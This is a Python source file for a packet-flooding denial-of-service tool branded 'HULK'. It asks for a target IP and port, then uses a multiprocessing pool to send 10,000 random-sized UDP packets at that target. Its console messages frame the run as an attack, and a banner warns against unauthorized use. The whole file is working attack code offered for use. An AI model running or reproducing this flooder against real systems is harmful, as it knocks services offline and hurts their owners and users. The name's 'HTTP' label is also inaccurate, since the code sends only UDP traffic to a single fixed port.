import os
import socket
import random
import sys
from datetime import datetime
from multiprocessing import Pool, cpu_count

def print_banner():
    print('''
    ************************************************
    *            _  _ _   _ _    _  __             *
    *           | || | | | | |  | |/ /             * 
    *           | __ | |_| | |__| ' <              *
    *           |_||_|\___/|____|_|\_\             *
    *                                              *
    *          HTTP UNBEARABLE LOAD KING           *
    *          Author: Sumalya Chatterjee          *
    *                                              *
    ************************************************
    ************************************************
    *                                              *    
    *  [!] WARNING:                               *
    *  UNAUTHORIZED USE OF THIS SOFTWARE           *
    *  FOR MALICIOUS PURPOSES MAY RESULT          *
    *  IN SEVERE LEGAL CONSEQUENCES.              *
    *                                              *
    *  HULK SMASH THOSE WHO ABUSE POWER!          *
    ************************************************
    ''')

def initialize_attack():
    os.system("clear")
    print_banner()
    print(" [+] HULK SMASH! PROVIDE A TARGET IP! 💥")
    ip = input(" [+] TARGET IP: ")
    port = int(input(" [+] STARTING PORT NO: "))
    return ip, port

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        print(" [x] HULK ANGRY! INVALID IP ADDRESS. PROVIDE A VALID IP! 😡")
        return False

def send_packet(args):
    ip, port = args
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        try:
            bytes = random._urandom(random.randint(100, 2000))  # Randomize packet size
            sock.sendto(bytes, (ip, port))
            return True
        except Exception as e:
            print(f" [!] HULK ANGRY! ERROR: {e} 😡")
            return False

def send_packets(ip, port):
    total_packets = 10000  # Total packets to send
    batch_size = 1000  # Number of packets to send per batch
    packets_sent = 0
    print(" [+] HULK READY! SMASHING TARGET! 💢")
    try:
        while packets_sent < total_packets:
            batch = min(batch_size, total_packets - packets_sent)
            args_list = [(ip, port)] * batch
            results = pool.map(send_packet, args_list)
            packets_sent += sum(results)
            print(f" [+] Packets Sent: {packets_sent}/{total_packets} 😠")
    except KeyboardInterrupt:
        print("\n [!] HULK ANGRY! INTERRUPT DETECTED... ABORTING 😡")
        print(" [-] ATTACK TERMINATED")

def main():
    ip, port = initialize_attack()
    if validate_ip(ip):
        send_packets(ip, port)
    else:
        print(" [x] HULK ANGRY! ABORTING ATTACK. 😡")

    input(" [+] PRESS ENTER TO EXIT")
    os.system("clear")
    print(" [-] HULK TIRED... 😡")

if __name__ == "__main__":
    pool = Pool(processes=cpu_count())
    main()
